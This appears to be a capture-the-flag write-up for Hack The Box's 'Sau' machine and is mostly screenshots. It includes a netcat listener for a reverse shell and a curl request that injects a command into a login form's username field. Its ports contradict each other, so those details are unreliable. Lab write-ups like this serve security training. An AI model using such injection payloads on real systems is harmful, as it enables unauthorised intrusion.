...
{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-01.png" >}}

Let’s export the target’s IP to the variable $IP, for a simplified usage.

{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-02.png" >}}

We can see that the target is reachable by pinging it:

{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-03.png" >}}

## |=---[ Scanning & Enumeration ]

Everything starts with nmap:

{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-04.png" >}}
...
{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-05.png" >}}
...
{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-06.png" >}}

Let’s open it!

{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-07.png" >}}

When we send a request to the link, we get this:

{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-08.png" >}}
...
{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-09.png" >}}

Now, on the [http://10.10.11.224:55555/3xt7ert/](http://10.10.11.224:55555/3xt7ert/) we have this:

{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-10.png" >}}
...
{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-11.png" >}}
...
```bash
nc -nlvp 1700listening on [any] 8000 ...
```
...
```bash
curl 'http://10.10.11.224:5555/pl64v6v/login' \  --data 'username=;`<THE_COMMAND>'
```
...
{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-12.png" >}}

Here is it!

{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-13.png" >}}

## |=---[ Privilege escalation ]

Let’s see if what we get with ***sudo -l*** :

{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-14.png" >}}
...
{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-15.png" >}}

We have escalated our privileges successfully. We have access now to the root flag!

{{< img src="/img/hack-the-box-sau-write-up/hack-the-box-sau-write-up-16.png" >}}
